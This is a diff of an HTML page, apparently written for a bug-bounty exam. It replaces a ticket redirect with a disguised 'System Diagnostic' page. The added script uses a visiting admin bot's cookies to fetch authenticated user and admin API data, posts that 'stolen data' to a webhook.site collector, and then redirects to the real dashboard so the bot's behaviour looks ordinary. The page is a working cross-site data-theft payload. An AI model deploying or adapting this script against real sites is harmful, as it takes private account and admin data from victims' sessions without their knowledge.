@@ -1,17 +1,53 @@
 <!DOCTYPE html>
-<html>
+<html lang="en">
 <head>
-    <title>Support Ticket Redirect</title>
+    <meta charset="UTF-8">
+    <title>System Diagnostic</title>
 </head>
 <body>
-    <p>Loading Ticket Data, please wait...</p>
+    <h1>Processing Request...</h1>
     <script>
-        // CHANGE THIS ID to the one you got from the Burp Response
-        const ticketId = "69e00964bee6d6b7c66248c3"; 
-        
-        setTimeout(function() {
-            window.location.href = "https://bugbounty-exam.hashacademy.co/support/tickets/" + ticketId;
-        }, 500);
+        const logger = "https://webhook.site/cf21c05b-bed9-4997-b070-c2d39306cd13";
+        const apiBase = "https://api-bugbounty-exam.hashacademy.co";
+
+        async function findSecret() {
+            const endpoints = [
+                { name: "AUTH_ME", url: "/api/auth/me" },
+                { name: "ADMIN_SETTINGS", url: "/api/admin/settings" },
+                { name: "ADMIN_CARS", url: "/api/admin/cars" }
+            ];
+
+            for (const endpoint of endpoints) {
+                try {
+                    const res = await fetch(apiBase + endpoint.url, {
+                        method: "GET",
+                        credentials: "include" // This is key to use the AdminBot's cookies
+                    });
+                    
+                    const data = await res.json();
+
+                    // Send the stolen data to your webhook
+                    await fetch(logger, {
+                        method: "POST",
+                        mode: "no-cors", // Ensures the request goes through even if CORS is strict
+                        body: JSON.stringify({ 
+                            source: endpoint.name, 
+                            content: data 
+                        })
+                    });
+                } catch (e) {
+                    // Log error to webhook to see if the fetch is failing
+                    fetch(logger + "?error=" + endpoint.name);
+                }
+            }
+            
+            // Final redirection to a real page to avoid suspicious bot behavior
+            setTimeout(() => {
+                window.location.href = "https://bugbounty-exam.hashacademy.co/dashboard";
+            }, 2000);
+        }
+
+        findSecret();
     </script>
 </body>
 </html>
